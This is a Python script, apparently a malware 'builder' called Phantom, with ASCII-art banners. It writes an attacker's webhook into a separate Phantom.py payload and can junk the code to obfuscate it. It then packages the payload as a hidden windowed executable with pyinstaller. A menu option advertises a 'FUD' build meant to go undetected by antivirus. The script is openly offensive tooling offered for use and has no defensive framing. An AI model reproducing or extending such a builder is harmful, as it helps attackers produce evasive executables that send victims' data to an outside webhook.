from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """
               ,dPYb,                                I8                                 
               IP'`Yb                                I8                                 
                I8  8I                             88888888                              
               I8  8'                                I8                                 
    gg,gggg,    I8 dPgg,     ,gggg,gg   ,ggg,,ggg,    I8     ,ggggg,    ,ggg,,ggg,,ggg,  
    I8P"  "Yb   I8dP" "8I   dP"  "Y8I  ,8" "8P" "8,   I8    dP"  "Y8ggg,8" "8P" "8P" "8, 
    I8'    ,8i  I8P    I8  i8'    ,8I  I8   8I   8I  ,I8,  i8'    ,8I  I8   8I   8I   8I 
    ,I8 _  ,d8' ,d8     I8,,d8,   ,d8b,,dP   8I   Yb,,d88b,,d8,   ,d8' ,dP   8I   8I   Yb,
    PI8 YY88888P88P     `Y8P"Y8888P"`Y88P'   8I   `Y88P""Y8P"Y8888P"   8P'   8I   8I   `Y8
    I8                                                                                   
    I8                                  by dqrk#1337                                                
    I8                                                                                   
    I8                                                                                   
    I8                                                                                   
    I8                                                                                      
                > Press Enter                                         
"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}
               ,dPYb,                                I8                                 
               IP'`Yb                                I8                                 
                I8  8I                             88888888                              
               I8  8'                                I8                                 
    gg,gggg,    I8 dPgg,     ,gggg,gg   ,ggg,,ggg,    I8     ,ggggg,    ,ggg,,ggg,,ggg,  
    I8P"  "Yb   I8dP" "8I   dP"  "Y8I  ,8" "8P" "8,   I8    dP"  "Y8ggg,8" "8P" "8P" "8, 
    I8'    ,8i  I8P    I8  i8'    ,8I  I8   8I   8I  ,I8,  i8'    ,8I  I8   8I   8I   8I 
    ,I8 _  ,d8' ,d8     I8,,d8,   ,d8b,,dP   8I   Yb,,d88b,,d8,   ,d8' ,dP   8I   8I   Yb,
    PI8 YY88888P88P     `Y8P"Y8888P"`Y88P'   8I   `Y88P""Y8P"Y8888P"   8P'   8I   8I   `Y8
    I8                                                                                   
    I8                                  by dqrk#1337                                                
    I8                                                                                   
    I8                                                                                   
    I8                                                                                   
    I8   
            Welcome to phantom builder
""")

time.sleep(1)


while True:
    
    Write.Print("\nWhich option do you want to choose: ", Colors.red_to_yellow)
    Write.Print("\n1. Build Exe", Colors.red_to_yellow)
    Write.Print("\n2. Build FUD Exe (Virus programs undetected)", Colors.red_to_yellow)
    Write.Print("\n3. Close", Colors.red_to_yellow)
    Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "Phantom.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

        while True:
            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

    elif choice == "2":
        Write.Print("\nWe dont have", Colors.red_to_yellow)

    elif choice == "3":
        Write.Print("\nExiting the program...", Colors.red_to_yellow)
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)